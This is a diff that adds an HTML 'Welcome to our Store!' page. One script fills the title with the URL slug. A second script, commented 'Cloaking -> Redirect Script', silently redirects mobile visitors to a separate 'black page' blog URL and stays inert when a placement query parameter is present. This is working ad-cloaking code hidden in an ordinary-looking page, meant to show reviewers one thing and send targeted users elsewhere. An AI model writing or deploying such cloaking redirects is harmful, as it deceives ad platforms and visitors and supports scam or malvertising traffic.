@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title> <!-- Initial title is empty -->
+</head>
+<body>
+    <h1>Welcome to our Store!</h1>
+    <p>You are shopping at: <span id="slug"></span></p>
+
+    <!-- Script to dynamically populate page title & body copy with slug name for uniquity -->
+
+    <script>
+        // Function to get the slug from the URL path
+        function getSlugFromURL() {
+            // Get the path part of the URL and split it by '/'
+            const pathSegments = window.location.pathname.split('/');
+            // The last segment should be the slug
+            const slug = pathSegments[pathSegments.length - 1];
+            return slug;
+        }
+
+        // Function to update the page title with the slug
+        function updatePageTitle() {
+            const slug = getSlugFromURL();
+            document.title = slug; // Set the page title to the slug
+        }
+
+        // Function to update the body text with the slug
+        function updateBodyText() {
+            const slug = getSlugFromURL();
+            const slugElement = document.getElementById('slug');
+            if (slugElement) {
+                slugElement.textContent = slug; // Set the text content of the span element to the slug
+            }
+        }
+
+        // Call both update functions when the page loads
+        window.addEventListener("DOMContentLoaded", () => {
+            updatePageTitle();
+            updateBodyText();
+        });
+    </script>
+
+    <!-- Cloaking -> Redirect Script -->
+
+    <script>
+        // Define values
+        const urlParams = new URLSearchParams(window.location.search);
+        const utmXXX = urlParams.get("xxx")
+        const blackPageURL = "https://lisas-blog-co-s.webflow.io"
+        const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+
+        // Execute cloaking logic
+        if (utmXXX === "__PLACEMENT__") {}
+            else if (isMobileDevice) {
+                window.location.href = blackPageURL;
+            }
+            else {}
+    </script>
+</body>
+</html>
